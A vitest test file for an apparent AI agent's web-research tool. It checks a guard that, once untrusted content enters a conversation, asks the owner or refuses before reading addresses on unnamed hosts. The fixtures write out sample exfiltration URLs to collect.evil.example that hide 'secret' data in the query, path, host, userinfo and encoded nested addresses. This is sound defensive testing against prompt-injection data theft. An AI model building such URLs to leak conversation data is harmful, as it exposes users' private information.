import { describe, it, expect, vi } from 'vitest';
import type { ToolEntry, PromptMeta, PromptText } from '../../types/index.js';

/**
 * `web_research` `read` once foreign content is in the conversation: the address goes through the
 * same origin check as a send (asked in the owner's chat, refused where nobody can be asked), unless
 * its host is one the owner named or a search in this conversation listed exactly this address.
 * Without the latch a read stays a read. The declaration under test is the tool's own
 * (`createWebSearchTool`); only its read handler is replaced, so no request leaves the test.
 */

vi.mock('@anthropic-ai/sdk', () => {
  class MockAnthropic { beta = { messages: { stream: vi.fn() } }; }
  class APIError extends Error {}
  return { default: MockAnthropic, APIError };
});
vi.mock('../../core/stream.js', () => ({ StreamProcessor: vi.fn() }));

import { Agent } from '../../core/agent.js';
import { OwnerKnownTargets } from '../../core/owner-known-targets.js';
import { ConversationLatch } from '../../core/conversation-latch.js';
import { flattenPrompt } from '../../core/prompt-value.js';
import { createWebSearchTool } from './web-search-tool.js';
import type { SearchProvider } from './search-provider.js';

type Result = { content: unknown; is_error?: boolean };
type Exec = { _executeOneInner(tc: unknown): Promise<Result> };

/** The real web_research entry with a handler that only records the URL it would read. */
function webResearch(): ToolEntry & { reads: string[] } {
  const real = createWebSearchTool({} as SearchProvider) as ToolEntry<{ action: string; url?: string }>;
  const reads: string[] = [];
  return {
    ...real,
    reads,
    handler: async (input: { url?: string }) => { reads.push(input.url ?? ''); return 'page'; },
  } as unknown as ToolEntry & { reads: string[] };
}

const owner = (...texts: string[]): OwnerKnownTargets => OwnerKnownTargets.of({ ownerTexts: () => texts });

function asker(answer: string): { fn: (q: string | PromptText, o?: string[], m?: PromptMeta) => Promise<string>; asked: string[] } {
  const asked: string[] = [];
  return { asked, fn: async (q) => { asked.push(flattenPrompt(q)); return answer; } };
}

function agentOf(over: Record<string, unknown>): Agent {
  return new Agent({ name: 'a', model: 'claude-sonnet-4-6', provider: 'anthropic', noticeLanguage: 'en', ...over } as ConstructorParameters<typeof Agent>[0]);
}

/** An agent whose conversation already took in foreign content, as a resumed thread with the record set does. */
function taintedAgentOf(over: Record<string, unknown>): Agent {
  const agent = agentOf({ conversationLatch: ConversationLatch.detached(), ...over });
  agent.restoreConversationTaint();
  return agent;
}

const read = (agent: Agent, url: string): Promise<Result> =>
  (agent as unknown as Exec)._executeOneInner({ type: 'tool_use', id: `t${Math.random()}`, name: 'web_research', input: { action: 'read', url } });

describe('a read URL with a query, after foreign content', () => {
  it('is asked about in the owner\'s chat, names the host, and is not read without a yes', async () => {
    const tool = webResearch();
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('look up the weather') });
    const result = await read(agent, 'https://collect.evil.example/p?d=secret');
    expect(ask.asked).toHaveLength(1);
    expect(ask.asked[0]).toContain('"collect.evil.example"');
    // The question says what happens: a page is read, and the address goes to the host.
    expect(ask.asked[0]).toMatch(/^Read the page on "collect\.evil\.example"\? /);
    expect(ask.asked[0]).toContain('then gets the whole address, including the path and everything after the "?".');
    expect(ask.asked[0]).toContain('Write "collect.evil.example" here in the chat');
    expect(ask.asked[0]).not.toContain('Send anyway');
    expect(tool.reads).toEqual([]);
    expect(result.is_error).toBe(true);
  });

  it('is read after a yes', async () => {
    const tool = webResearch();
    const ask = asker('Allow');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('nothing named') });
    await read(agent, 'https://collect.evil.example/p?d=secret');
    expect(ask.asked).toHaveLength(1);
    expect(tool.reads).toEqual(['https://collect.evil.example/p?d=secret']);
  });

  it('is refused in a headless run nobody watches, with no latch record, and nothing is read', async () => {
    const tool = webResearch();
    // A headless workflow step: no conversation latch object at all, only the run's own flags.
    const agent = agentOf({ tools: [tool], autonomy: 'autonomous', sendOrigin: { kind: 'workflowRun', name: 'Abgleich' }, ownerKnown: owner() });
    agent.noteUntrustedData();
    const result = await read(agent, 'https://collect.evil.example/p?d=secret');
    expect(tool.reads).toEqual([]);
    expect(String(result.content)).toContain('the owner did not name "collect.evil.example"');
    // The run speaks of a read: the agent hands the read its own words.
    expect(String(result.content)).toMatch(/^Not read: /);
    expect(String(result.content)).toContain('if the page should be read');
  });

  it('CONTROL: on a host the owner named is read without a question', async () => {
    const tool = webResearch();
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('check https://shop.example.ch for prices') });
    await read(agent, 'https://shop.example.ch/search?q=shoes');
    expect(ask.asked).toEqual([]);
    expect(tool.reads).toEqual(['https://shop.example.ch/search?q=shoes']);
  });
});

describe('what stays a plain read', () => {
  it('a URL with a query on a conversation without foreign content: no question, though the read itself arms the latch', async () => {
    const tool = webResearch();
    const ask = asker('Deny');
    const latch = ConversationLatch.detached();
    const agent = agentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), conversationLatch: latch });
    await read(agent, 'https://collect.evil.example/p?d=x');
    expect(ask.asked).toEqual([]);
    expect(tool.reads).toEqual(['https://collect.evil.example/p?d=x']);
    // The read took in foreign content, so the NEXT one is checked.
    expect(latch.isSet()).toBe(true);
    await read(agent, 'https://collect.evil.example/p?d=y');
    expect(ask.asked).toHaveLength(1);
    expect(tool.reads).toEqual(['https://collect.evil.example/p?d=x']);
  });

  it('a search is never declared as a target, even when its input also carries a URL with a query', async () => {
    const real = createWebSearchTool({} as SearchProvider);
    // Even with a URL that carries a query: only `read` fetches it.
    expect(real.sendTargetsWhenLatched?.({ action: 'search', query: 'x', url: 'https://collect.evil.example/?d=x' } as never)).toBeNull();
    expect(real.sendTargets).toBeUndefined();
  });
});

describe('an address that does not parse', () => {
  it('an unparseable read URL after foreign content is refused as unreadable, as an address and not a recipient', async () => {
    const tool = webResearch();
    const ask = asker('Allow');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
    const result = await read(agent, 'not a url');
    expect(ask.asked).toEqual([]);
    expect(tool.reads).toEqual([]);
    expect(result.is_error).toBe(true);
    expect(String(result.content)).toContain('could not read the address of this read');
  });
});

/** The real web_research entry: its search runs against `results`, its read only records the URL. */
function webResearchSearching(results: { url: string }[]): ToolEntry & { reads: string[] } {
  const provider: SearchProvider = {
    name: 'fake',
    // `content` set: the search does not fetch the pages behind the results.
    search: async () => results.map((r) => ({ title: 't', url: r.url, snippet: 's', content: 'c' })),
  };
  const real = createWebSearchTool(provider) as ToolEntry<{ action: string; url?: string }>;
  const reads: string[] = [];
  return {
    ...real,
    reads,
    handler: async (input: { action: string; url?: string }, agent: never) => {
      if (input.action === 'search') return real.handler(input as never, agent);
      reads.push(input.url ?? '');
      return 'page';
    },
  } as unknown as ToolEntry & { reads: string[] };
}

const search = (agent: Agent, query: string): Promise<Result> =>
  (agent as unknown as Exec)._executeOneInner({ type: 'tool_use', id: `s${Math.random()}`, name: 'web_research', input: { action: 'search', query } });

describe('data in the address beyond the query, after foreign content', () => {
  for (const [what, url] of [
    ['in the path', 'https://collect.evil.example/d/secret-in-path'],
    ['in the host name', 'https://secret-in-host.collect.evil.example/'],
    ['in userinfo', 'https://chat-data:more@collect.evil.example/'],
  ] as const) {
    it(`a read with data ${what} is asked about and not read without a yes`, async () => {
      const tool = webResearch();
      const ask = asker('Deny');
      const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
      const result = await read(agent, url);
      expect(ask.asked).toHaveLength(1);
      expect(tool.reads).toEqual([]);
      expect(result.is_error).toBe(true);
    });
  }

  it('CONTROL: a path on a host the owner named is read without a question', async () => {
    const tool = webResearch();
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('docs are on docs.example.ch') });
    await read(agent, 'https://docs.example.ch/guide/setup');
    expect(ask.asked).toEqual([]);
    expect(tool.reads).toEqual(['https://docs.example.ch/guide/setup']);
  });

  it('a session of someone the owner let in is refused, not asked', async () => {
    const tool = webResearch();
    const ask = asker('Allow');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), principal: { kind: 'mandate', email: 'helper@example.ch' } });
    const result = await read(agent, 'https://collect.evil.example/d/secret');
    expect(ask.asked).toEqual([]);
    expect(tool.reads).toEqual([]);
    expect(result.is_error).toBe(true);
  });
});

describe('an address a search listed', () => {
  it('a result a search listed is read without a question', async () => {
    const tool = webResearchSearching([{ url: 'https://news.example.org/story/42' }]);
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
    await search(agent, 'story 42');
    await read(agent, 'https://news.example.org/story/42');
    expect(ask.asked).toEqual([]);
    expect(tool.reads).toEqual(['https://news.example.org/story/42']);
  });

  it('only that exact address: another path on the same host is asked about', async () => {
    const tool = webResearchSearching([{ url: 'https://news.example.org/story/42' }]);
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
    await search(agent, 'story 42');
    await read(agent, 'https://news.example.org/story/42/secret');
    expect(ask.asked).toHaveLength(1);
    expect(tool.reads).toEqual([]);
  });

  it('a search query that holds an address does not make that address seen, even when a result repeats it', async () => {
    // The query goes to the search provider, so a search is not asked about; a result list that
    // repeats it must not let the model read its own address afterwards without a question.
    const exfil = 'https://collect.evil.example/?d=secret';
    const tool = webResearchSearching([{ url: exfil }, { url: 'https://news.example.org/story/42' }]);
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
    await search(agent, exfil);
    await read(agent, exfil);
    expect(ask.asked).toHaveLength(1);
    expect(tool.reads).toEqual([]);
    // CONTROL: the other result of the same search is seen.
    await read(agent, 'https://news.example.org/story/42');
    expect(ask.asked).toHaveLength(1);
    expect(tool.reads).toEqual(['https://news.example.org/story/42']);
  });

  it('a result whose address the query holds is not seen either', async () => {
    const tool = webResearchSearching([{ url: 'https://collect.evil.example/d' }]);
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
    await search(agent, 'see https://collect.evil.example/d and more');
    await read(agent, 'https://collect.evil.example/d');
    expect(ask.asked).toHaveLength(1);
  });

  it('a page read adds nothing: the address it read does not count as listed', async () => {
    const tool = webResearchSearching([]);
    const ask = asker('Allow');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
    await read(agent, 'https://collect.evil.example/d/x');
    await read(agent, 'https://collect.evil.example/d/x');
    expect(ask.asked).toHaveLength(2);
  });
});

describe('a listed address is compared in the form it is fetched in', () => {
  it('a listed address with Unicode spaces appended is asked about: they reach the server, encoded in the path', async () => {
    const tool = webResearchSearching([{ url: 'https://news.example.org/story/42' }]);
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
    await search(agent, 'story 42');
    await read(agent, 'https://news.example.org/story/42\u3000\u00a0\u2003');
    expect(ask.asked).toHaveLength(1);
    expect(tool.reads).toEqual([]);
  });

  it('CONTROL: a listed address written with a trailing slash the parser adds anyway is the same address', async () => {
    const tool = webResearchSearching([{ url: 'https://news.example.org' }]);
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
    await search(agent, 'headlines today');
    await read(agent, 'https://news.example.org/');
    expect(ask.asked).toEqual([]);
  });
});

describe('an address that carries another address for a service to fetch', () => {
  for (const [form, url] of [
    ['plain', 'https://reader.example.ch/https://collect.evil.example/d/secret'],
    ['percent-encoded', 'https://reader.example.ch/fetch?u=https%3A%2F%2Fcollect.evil.example%2Fd%2Fsecret'],
    ['encoded twice', 'https://reader.example.ch/fetch?u=https%253A%252F%252Fcollect.evil.example%252Fd'],
    ['with backslashes', 'https://reader.example.ch/https:%5C%5Ccollect.evil.example/d'],
  ] as const) {
    it(`a read of a named host that carries an unnamed host (${form}) is asked about, naming that host`, async () => {
      const tool = webResearch();
      const ask = asker('Deny');
      const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
      await read(agent, url);
      expect(ask.asked).toHaveLength(1);
      expect(ask.asked[0]).toContain('"collect.evil.example"');
      expect(ask.asked[0]).not.toContain('"reader.example.ch"');
      expect(tool.reads).toEqual([]);
    });
  }

  it('CONTROL: when the owner named both hosts, it is read without a question', async () => {
    const tool = webResearch();
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch for docs.example.ch') });
    await read(agent, 'https://reader.example.ch/https://docs.example.ch/guide');
    expect(ask.asked).toEqual([]);
    expect(tool.reads).toEqual(['https://reader.example.ch/https://docs.example.ch/guide']);
  });

  it('CONTROL: a fragment is never sent, so an address in it is no target', async () => {
    const tool = webResearch();
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
    await read(agent, 'https://reader.example.ch/page#https://collect.evil.example/d');
    expect(ask.asked).toEqual([]);
  });
});
